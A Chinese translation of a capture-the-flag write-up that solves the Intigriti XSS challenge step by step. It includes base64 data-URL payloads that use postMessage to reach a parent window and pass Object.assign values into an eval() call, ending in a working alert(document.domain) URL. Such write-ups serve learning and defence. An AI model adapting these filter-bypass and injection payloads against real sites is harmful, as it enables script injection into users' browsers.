> 原文链接: https://www.anquanke.com//post/id/178041 


# Intigriti XSS挑战全教程


                                阅读量   
                                **211312**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：
                                <br>原文地址：[https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html](https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01e360447cf6575a4d.jpg)](https://p0.ssl.qhimg.com/t01e360447cf6575a4d.jpg)



## 写在前面的话

Intigriti近期发布了一个非常有意思的XSS挑战项目，该项目要求我们制作一个特殊的URL，而这个URL不仅要能够给iframe分配src参数，而且还要能够发送eval()调用来弹出一个“alert(document.domain)”弹窗，这就是这项XSS挑战的目标和要求。那我们应该怎么做呢？接下来，我们一起看一看实现这个目标需要哪些步骤和方法。

注意：最终的漏洞以及漏洞利用代码只适用于Chrome，所以我们推荐大家使用Chrome浏览器来进行测试。



## 代码分析

现在，我们暂时先不要过多考虑XSS以及XSS漏洞利用方面的东西，首先我们要做的就是搞清楚这个XSS挑战项目所要涉及到的JavaScript代码。

```
const url = new URL(decodeURIComponent(document.location.hash.substr(1))).href.replace(/script|&lt;|&gt;/gi, "forbidden");
const iframe = document.createElement("iframe"); iframe.src = url; document.body.appendChild(iframe);
iframe.onload = function()`{` window.addEventListener("message", executeCtx, false);`}`
function executeCtx(e) `{`
  if(e.source == iframe.contentWindow)`{`
    e.data.location = window.location;
    Object.assign(window, e.data);
    eval(url);
  `}`
`}`
```

1、 上述代码首先获取的是当前页面URL的哈希值，并根据哈希解码URL实体，然后使用字符串“forbidden”替换掉了所有的“script”、“&lt;”或“&gt;”实例。最终代码运行完之后，会分配一个“url”变量。<br>
2、 接下来，代码会在当前页面中创建一个iframe，这个iframe的src参数值就是之前创建的“url”变量，然后将这个URL地址加载进iframe中。<br>
3、 当iframe加载完毕之后，我们会开始监听message事件，并在监听到message事件后调用executeCtx。<br>
4、 executeCtx函数的功能定义如下：

a) 该函数会确保事件来自于这个iframe；<br>
b) 事件中Payload的“location”属性会根据当前窗口的“location”参数进行重写，并保护当前地址不会重定向至其他URL；<br>
c) Payload对象的每一个参数都会分配当前窗口的Object.assign(window、e.data)，这也就意味着，任何发送给executeCtx()函数的值都会在window中定义；<br>
d) 通过eval()函数对url变量进行处理；

仔细阅读完上述代码之后，我脑海中第一个反应就是：message事件是个什么玩意儿？翻了半天文档之后，我发现这是一个用于跨源通信的API，它使用了window.postMessage方法来允许我们向任何监听message事件的组件发送对象。这就非常有意思了！



## XSS漏洞利用

既然我们的目标是找到一个XSS漏洞并利用之，那“eval(url)”明显就是我们的目标了。一开始，对于如何利用“url”参数来寻找并利用XSS漏洞，我是毫无头绪的，但这个阶段暂时不用过多关注XSS方面的东西。我当前主要关注的东西就是“eval()”。不过，在真正利用eval()调用之前，我们还有很多操作和步骤需要做，但如果能够成功，我们就离最终的XSS漏洞不远了。不过现在，大家先把XSS的事情放一放。

### <a class="reference-link" name="%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>一步一步实现漏洞利用

<a class="reference-link" name="Iframe%E4%B8%AD%E7%9A%84JavaScript"></a>**Iframe中的JavaScript**

根据我以往的经验，这种情况下的XSS漏洞一般都跟Data URL（前缀为data:的URL）有关。Data URL允许我们使用Base64来编码Payload，因此这样就可以轻松绕过

```
.replace(/script|&lt;|&gt;/gi, "forbidden")
```

过滤器了。

我尝试了以下地址参数：

```
https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=
```

即&lt;script&gt;alert(‘hi’);&lt;/script&gt;的Base64编码格式，并成功实现了alert弹窗。但是alert(document.domain)并没有在iframe中成功运行，因为这是一个Data URL，其中并不包含域名。虽然现在有了弹窗警告框，但是我想要的是在iframe外部实现它，所以我们现在还没成功。

<a class="reference-link" name="%E5%90%91%E7%88%B6%E7%AA%97%E5%8F%A3%E5%8F%91%E9%80%81%E6%B6%88%E6%81%AF"></a>**向父窗口发送消息**

在现在这个阶段，我们的目标仍然是eval(url)。现在，我们需要发送一条消息来运行executeCtx()函数。我尝试了刚才了解到的那个API，并使用了下列脚本代码：

```
&lt;script&gt;window.postMessage("test", "*")&lt;/script&gt;
```

postMessage()函数的第二个参数是我们的目标源，这里我们传入的是”*”，虽然这样做不安全（任何人都可以拦截到我的消息），不过这不是我们在这里需要考虑的事情。最终编码后的URL如下：

```
https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucG9zdE1lc3NhZ2UoInRlc3QiLCAiKiIpPC9zY3JpcHQ+.
```

运行之后竟然没有效果！我在executeCtx()中设置了一个断点，但是并没有被触发。所以我去翻了一下MDN文档，并查看了postMessage函数的调用方式：

** [![](https://p4.ssl.qhimg.com/t01402a4f3edae9d7f0.png)](https://p4.ssl.qhimg.com/t01402a4f3edae9d7f0.png)**

原来，postMessage()必须在接收消息的窗口中被调用。对Payload进行修改之后，我们就能实现我们的目标了，修改后的代码如下：

```
&lt;script&gt;window.parent.postMessage("test", "*")&lt;/script&gt;
```

我需要主window接收到这条消息，那么对于iframe来说，我们要用的就是window.parent了。新生成的URL如下：

```
https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKCJ0ZXN0IiwgIioiKTwvc2NyaXB0Pg.
```

非常好，现在我们就可以在executeCtx中触发JavaScript错误了：

```
(index):31 Uncaught TypeError: Failed to set an indexed property on 'Window': Index property setter is not supported.
    at Function.assign (&lt;anonymous&gt;)
    at executeCtx ((index):31)
```

这是因为我们的数据类型位字符串类型，触发错误的地方在“Object.assign(window, e.data);”这一行。我们先试试传递一个空对象进去，修改后的Payload如下：

```
&lt;script&gt;window.parent.postMessage(`{``}`, "*")&lt;/script&gt;
```

编码后的URL地址如下：

```
https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+
```

运行之后，我们接收到了eval(url)抛出的异常，异常信息为“Uncaught SyntaxError: Unexpected end of input”。所以，这个函数是法处理url变量外的有效JavaScript代码，而这里url变量设置的值为：

```
data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+
```

可是，它怎么看都不像JavaScript代码啊…

### <a class="reference-link" name="%E6%8A%8AURL%E5%8F%98%E6%88%90JavaScript"></a>把URL变成JavaScript

现在，我们的目标就变成了如何让eval(url)来解析有效的JavaScript代码（现在我们仍不需要考虑XSS利用方面的问题）。我知道很多东西都可以通过编码来转变成JavaScript代码，比如说JSFuck之类的。所以我尝试在控制台中运行了下列代码：

```
eval('data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+')
```

正如我们所期待的那样，代码抛出了之前相同的错误：“Unexpected end of input”，这就意味着解析器还需要我们传入另一个参数。我设计的URL结尾是一个“+”，不过对于JavaScript来说，这个字符其实没啥作用，所以我把它删掉了。但是这样会让我的Base64编码字符串失效，这个可以之后再处理了。

```
&gt; eval('data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ')
VM42:1 Uncaught ReferenceError: text is not defined
    at eval (eval at &lt;anonymous&gt; ((index):1), &lt;anonymous&gt;:1:6)
    at &lt;anonymous&gt;:1:1
```

“text”未定义？什么鬼！这里我专门定义了一个“text = 1”，然后再次运行我的eval()：

```
&gt; text = 1
1
&gt; eval('data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ')
VM70:1 Uncaught ReferenceError: html is not defined
    at eval (eval at &lt;anonymous&gt; ((index):1), &lt;anonymous&gt;:1:11)
    at &lt;anonymous&gt;:1:1
```

结尾没有“+”符号的URL是有效的JavaScript，下面给出的是带有缩进格式和注释的URL：

```
data: // a label for a goto
text/html; // divides the variable text by the variable html
base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ // evalutes the base64 variable and the PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ variable then returns the latter (see , operator)
```

虽然这些代码看起来怪怪的，但它确实是有效的JavaScript代码。字符串结尾的“+”字符只是Base64编码的标准格式，无需过多关注。如果字符串结尾部分为“+”，我将添加无效字符来填充Base64编码，并且让最终的编码字符串为一个有效的变量名。



## XSS漏洞利用

现在，我们可以用编码后的JavaScript来调用eval()函数了。那么接下来，我们应该把“alert(document.domain)”放在哪儿呢？没错，我们还是得回去翻一下MDN文档，，查看一下关于Data URL的更多内容：

[![](https://p2.ssl.qhimg.com/t01ee20d57a8c3faa1a.png)](https://p2.ssl.qhimg.com/t01ee20d57a8c3faa1a.png)

其中的“;charset=US-ASCII”成功吸引到了我的注意。我是不是可以把我的Payload放在这里呢？而且这跟JavaScript的格式也很像！所以我在控制台中尝试了下列代码：

```
&gt; text = 1
1
&gt; html = 1
1
&gt; eval('data:text/html;charset=alert(1);base64,whatever')
Uncaught ReferenceError: base64 is not defined
    at eval (eval at &lt;anonymous&gt; ((index):1), &lt;anonymous&gt;:1:33)
    at &lt;anonymous&gt;:1:1
```

终于成功了！警告弹窗一切正常，虽然代码报错“base64未定义“，但最终的Base64编码在弹窗时还是成功的，所以我也不想管它了。接下来，我们在Web页面上尝试一下。我把我的Payload修改为了：

```
&lt;script&gt;window.parent.postMessage(`{`text:1, html:1, base64:1`}`, "*")&lt;/script&gt;hi intigriti
```

别忘了，“Object.assign(window, e.data)“这一行可以根据我传递过来的消息去定义“text”和“html”变量。结尾的“hi intigriti”只是为了替换掉之前base64编码Payload结尾的“+”。

现在我的URL编码地址如下：

```
https://challenge.intigriti.io/#data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp
```

但是，好像这个URL并没有什么用…

我们可以直接在浏览器地址栏中输入Payload，下面这个URL会弹出一条“This site can’t be reached”的错误信息，后来我才发现出问题的地方在于“alert(1)”。



## 最终解决方案

```
https://challenge.intigriti.io/#data:text/html;alert(document.domain);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp
```

[![](https://p5.ssl.qhimg.com/t0159cacd353ac50a79.png)](https://p5.ssl.qhimg.com/t0159cacd353ac50a79.png)

终于成功啦！！！



## 总结

1、 想要了解你想要攻击的代码是非常重要的，而且需要花很多的时间和精力。<br>
2、 不要太过专注于最终的目标，我们要好好计划中间步骤，并针对这些步骤来稳扎稳打的走好每一步，曲线救国也是不错的思路。<br>
3、 如果你没有思路的话，不要着急，给自己一点时间和耐心，按照计划一步一步去走就好，最终我们都会成功的！
